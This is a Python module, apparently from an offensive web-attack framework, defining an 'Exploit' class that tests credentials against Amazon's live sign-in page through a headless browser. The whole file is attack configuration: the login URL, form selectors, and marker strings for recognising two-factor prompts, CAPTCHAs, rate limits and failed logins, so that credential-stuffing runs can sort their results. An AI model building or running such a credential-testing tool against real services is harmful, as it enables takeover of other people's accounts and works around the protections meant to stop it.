"""Amazon Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Amazon Credential Tester"
    description = "Tests credentials against Amazon sign-in via a headless browser."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "amazon"
    browser_login_url = "https://www.amazon.com/gp/sign-in.html"
    username_selector = "input[name=email]"
    username_submit_selector = "input[type=submit]"
    password_selector = "input[name=password]"
    submit_enter = True
    submit_selectors = ("input[type=submit]", "button[id=signInSubmit]", "button[type=submit]")
    browser_login_paths = ("/ap/signin", "/ap/oa", "/ax/claim", "/ap/register")
    twofa_markers = (
        "two-step verification", "two-step", "2fa", "verification code",
        "enter the otp", "confirm it's you",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "we detected unusual",
    )
    rate_markers = (
        "too many attempts", "try again later", "temporarily", "rate limit",
        "many login attempts",
    )
    invalid_markers = (
        "there was a problem", "your password is incorrect", "incorrect password",
        "we cannot find an account", "does not match", "doesn't match",
        "no account found", "password you entered", "invalid email address",
        "looks like you're new to", "proceed to create an account",
    )
